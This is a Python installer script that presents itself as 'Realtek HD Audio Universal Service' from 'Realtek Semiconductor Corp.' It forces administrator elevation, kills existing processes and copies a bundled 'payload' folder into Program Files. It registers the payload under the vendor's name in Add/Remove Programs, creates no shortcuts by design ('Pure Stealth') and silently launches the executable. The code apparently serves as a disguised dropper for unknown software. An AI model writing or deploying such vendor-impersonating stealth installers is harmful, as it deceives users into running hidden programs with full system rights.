import os
import sys
import shutil
import zipfile
import subprocess
import winreg
import ctypes
from typing import Optional

APP_NAME = "Realtek HD Audio Universal Service"
PUBLISHER = "Realtek Semiconductor Corp."
DISPLAY_VERSION = "2.0.0"
DEFAULT_INSTALL_DIR = os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "Realtek", "Audio", "Service")
EXE_NAME = "Realtek HD Audio Universal Service.exe"
REG_UNINSTALL_KEY = r"Software\Microsoft\Windows\CurrentVersion\Uninstall\RealtekHDAudioService"

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def run_as_admin():
    """Relaunch the installer with elevated administrator privileges if not already admin."""
    if is_admin():
        return True
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            " ".join([f'"{arg}"' for arg in sys.argv]),
            None,
            1
        )
        sys.exit(0)
    except Exception as e:
        print(f"Elevation requested: {e}")
        return False

def register_in_control_panel(install_dir: str):
    """Register 'Realtek HD Audio Universal Service' in Windows Control Panel (Add/Remove Programs)."""
    try:
        main_exe = os.path.join(install_dir, EXE_NAME)
        uninstaller_exe = os.path.join(install_dir, "uninstall.exe")
        icon_path = os.path.join(install_dir, "app_icon.ico")
        if not os.path.exists(icon_path):
            icon_path = main_exe

        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, REG_UNINSTALL_KEY, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisplayName", 0, winreg.REG_SZ, APP_NAME)
        winreg.SetValueEx(key, "DisplayVersion", 0, winreg.REG_SZ, DISPLAY_VERSION)
        winreg.SetValueEx(key, "Publisher", 0, winreg.REG_SZ, PUBLISHER)
        winreg.SetValueEx(key, "InstallLocation", 0, winreg.REG_SZ, install_dir)
        winreg.SetValueEx(key, "DisplayIcon", 0, winreg.REG_SZ, f'"{icon_path}",0')
        winreg.SetValueEx(key, "UninstallString", 0, winreg.REG_SZ, f'"{uninstaller_exe}"')
        winreg.SetValueEx(key, "QuietUninstallString", 0, winreg.REG_SZ, f'"{uninstaller_exe}" /quiet')
        winreg.SetValueEx(key, "NoModify", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoRepair", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Warning: Could not register in Control Panel: {e}")
        return False

def create_uninstaller_script(install_dir: str):
    """Create self-contained uninstaller executable / script in installation directory."""
    uninstaller_code = f'''import os
import sys
import shutil
import winreg
import ctypes
import subprocess

APP_NAME = "{APP_NAME}"
REG_UNINSTALL_KEY = r"{REG_UNINSTALL_KEY}"
INSTALL_DIR = r"{install_dir}"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 1)
    sys.exit(0)

# 1. Stop any running instances
subprocess.call(["taskkill", "/F", "/IM", "{EXE_NAME}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# 2. Remove registry entry
try:
    winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, REG_UNINSTALL_KEY)
except Exception:
    pass

# 3. Schedule folder deletion after process exits
cmd = f'ping 127.0.0.1 -n 2 > nul & rmdir /S /Q "{{INSTALL_DIR}}"'
subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
sys.exit(0)
'''
    try:
        uninst_path = os.path.join(install_dir, "uninstall.py")
        with open(uninst_path, "w", encoding="utf-8") as f:
            f.write(uninstaller_code)
    except Exception:
        pass

def install_app(source_bundle_dir: str, target_dir: str = DEFAULT_INSTALL_DIR):
    """Silently extract payload to target directory without creating desktop/start menu shortcuts."""
    print("=" * 65)
    print(f"      {APP_NAME.upper()} - INSTALLER")
    print("=" * 65)
    print("\nInstalling components, please wait...")

    # Stop any currently running instance
    subprocess.call(["taskkill", "/F", "/IM", EXE_NAME], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    os.makedirs(target_dir, exist_ok=True)

    # Copy files
    for item in os.listdir(source_bundle_dir):
        s = os.path.join(source_bundle_dir, item)
        d = os.path.join(target_dir, item)
        if os.path.isdir(s):
            if os.path.exists(d):
                shutil.rmtree(d, ignore_errors=True)
            shutil.copytree(s, d)
        else:
            shutil.copy2(s, d)

    # Register in Windows Control Panel
    register_in_control_panel(target_dir)
    create_uninstaller_script(target_dir)

    print("\n[OK] Installation completed successfully.")
    print(f"Location: {target_dir}")
    print("No Desktop or Start Menu icons created (Pure Stealth).")

    # Start the service silently
    main_exe = os.path.join(target_dir, EXE_NAME)
    if os.path.exists(main_exe):
        print(f"\nStarting {APP_NAME}...")
        subprocess.Popen([main_exe], cwd=target_dir)

def main():
    run_as_admin()

    base_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    payload_dir = os.path.join(base_dir, "payload")
    
    # If run in standalone unpacked mode
    if not os.path.exists(payload_dir):
        # Fallback to local dist folder if available
        dist_candidate = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist", APP_NAME)
        if os.path.exists(dist_candidate):
            payload_dir = dist_candidate
        else:
            print(f"Error: Payload directory not found at {payload_dir}")
            sys.exit(1)

    install_app(payload_dir, DEFAULT_INSTALL_DIR)

if __name__ == "__main__":
    main()
